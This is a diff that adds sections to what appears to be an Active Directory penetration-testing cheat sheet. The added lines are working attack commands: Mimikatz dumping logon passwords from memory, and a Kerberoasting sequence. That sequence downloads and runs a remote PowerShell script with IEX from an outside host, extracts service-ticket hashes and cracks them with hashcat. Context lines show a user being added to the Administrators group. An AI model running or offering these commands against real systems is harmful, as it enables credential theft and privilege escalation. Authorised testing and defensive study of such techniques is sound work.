@@ -120,3 +120,24 @@ Note :
 ➤ 4. Verify that our user has been added in the localgroup Administrators
 net localgroup Administrators
 ```
+
+## Mimikatz
+```
+import-module .\Invoke-Mimikatz
+Invoke-Mimikatz privilege::debug sekurlsa::logonpasswords
+```
+
+## Roast a SPN
+```
+➤ 1. Download Kerberoast
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Invoke-Kerberoast.ps1')
+
+➤ 2. Execute kerberoast
+Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kbt-hash.txt
+
+➤ 3. Delete the line break
+cat kbt-hash.txt|tr -d "\r\n"|tee kbt-hash2.txt
+
+➤ 4. Crack the ticket
+hashcat -m 13100 -a 0 -o cracked.txt kbt-hash2.txt /usr/share/wordlists/rockyou.txt
+```
